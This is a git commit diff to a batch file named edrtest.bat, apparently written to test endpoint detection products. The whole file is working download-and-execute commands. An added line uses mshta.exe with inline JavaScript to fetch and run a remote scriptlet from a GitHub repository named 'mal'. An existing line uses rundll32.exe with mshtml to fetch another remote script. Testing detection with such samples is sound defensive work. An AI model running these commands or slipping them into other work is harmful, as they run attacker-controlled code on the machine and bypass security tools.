f138741a2a87c0c829acdcd645add59876f3b92b
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-02-19 18:01:36 +0900

    Update edrtest.bat

--- edrtest.bat
+++ edrtest.bat
@@ -1,1 +1,2 @@
+mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3.sct")).Exec();close()
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2")
